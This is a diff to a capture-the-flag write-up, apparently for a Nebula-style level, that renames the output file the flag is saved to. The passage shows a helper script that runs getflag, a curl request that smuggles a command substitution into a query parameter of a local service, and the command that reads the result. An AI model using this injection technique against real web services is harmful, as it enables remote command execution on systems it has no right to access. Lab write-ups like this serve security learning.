@@ -19,7 +19,7 @@ I created the following script in `vim`:
 ```bash
 #!/bin/bash
 
-getflag > /tmp/result
+getflag > /tmp/result_level12
 ```
 
 After creating the script, I made it executable:
@@ -38,12 +38,12 @@ I crafted the following `curl` request to pass the exploit:
 curl 'http://localhost:4646/?x=$(/*/SCRIPT)'
 ```
 
-This executed the `/tmp/SCRIPT` script, running getflag, which saved the flag in `/tmp/result`.
+This executed the `/tmp/SCRIPT` script, running getflag, which saved the flag in `/tmp/result_level12`.
 
 ### Step 4: Retrieving the Flag
 
-After executing the exploit, I retrieved the flag by reading the contents of the `/tmp/result` file:
+After executing the exploit, I retrieved the flag by reading the contents of the `/tmp/result_level12` file:
 
 ```bash
-cat /tmp/result
+cat /tmp/result_level12
 ```
